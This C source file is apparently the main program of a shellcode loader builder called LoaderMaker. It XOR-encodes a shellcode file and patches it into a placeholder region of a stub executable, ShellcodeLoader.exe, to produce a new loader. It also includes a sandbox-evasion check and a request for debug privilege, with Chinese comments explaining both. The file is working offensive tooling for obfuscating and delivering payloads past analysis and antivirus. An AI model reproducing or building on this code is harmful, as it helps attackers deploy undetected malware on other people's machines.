#include "main.h"


int main(int argc, char* argv[], char* envp[])
{
	printf(" .--. .-.         .-.  .-.                 .-.      .-.                   .-.           \r\n");
	printf(": .--': :         : :  : :                 : :      : :                   : :           \r\n");
	printf("`. `. : `-.  .--. : :  : :   .--.  .--.  .-' : .--. : :    .--.  .--.   .-' : .--. .--. \r\n");
	printf(" _`, :: .. :' '_.': :_ : :_ '  ..'' .; :' .; :' '_.': :__ ' .; :' .; ; ' .; :' '_.': ..'\r\n");
	printf("`.__.':_;:_;`.__.'`.__;`.__;`.__.'`.__.'`.__.'`.__.':___.'`.__.'`.__,_;`.__.'`.__.':_;  \r\n");
	printf("                                                                                        \r\n");
	if (argc == 3)
	{
		if (IsSandbox() == TRUE)//检测模拟环境
			return 0;
		// 首先提权一波
		GrantPriviledge(SE_DEBUG_NAME);//防止权限不够
		FILEINFO shellinfo = Openfile(argv[1]);
		for (int i = 0; i < shellinfo.size; i++)
		{
			shellinfo.ptrbuffer[i] = (shellinfo.ptrbuffer[i] ^ i )+ 1;
		}

        char loadername[] = "ShellcodeLoader.exe";
        FILEINFO loaderinfo = Openfile(loadername);
		int cnt = 0,offset = 0,num = 0;
		while (TRUE)
		{
			if (loaderinfo.ptrbuffer[cnt] == 0x41)
			{
				offset = cnt;
				while (loaderinfo.ptrbuffer[cnt] == 0x41)
				{
					cnt++;
					num++;
					if (num > 0x50)
					{
						break;
					}
				}
			}
			if (num > 0x50)
			{
				break;
			}
			cnt++;
			num = 0,offset = 0;
			//scan shellcode buffer
		}
		Mymemcpy(&(loaderinfo.ptrbuffer[offset]), &(shellinfo.size),sizeof(DWORD));

		Mymemcpy(&(loaderinfo.ptrbuffer[offset + sizeof(DWORD)]), shellinfo.ptrbuffer, shellinfo.size);
		Write2file(loaderinfo.ptrbuffer, loaderinfo.size,argv[2]);
		printf("\r\n[+] output file------->%s\r\n",argv[2]);
	}
	else
	{
		printf("[*]usage:\r\n");
		printf("[*]LoaderMaker.exe <shellcode.c>  <outfile.exe> \r\n");
		printf("[*]example:\r\n");
		printf("[*]LoaderMaker.exe shellcode.bin loader.exe\r\n");
	}
	//getchar();
	return 0;
}
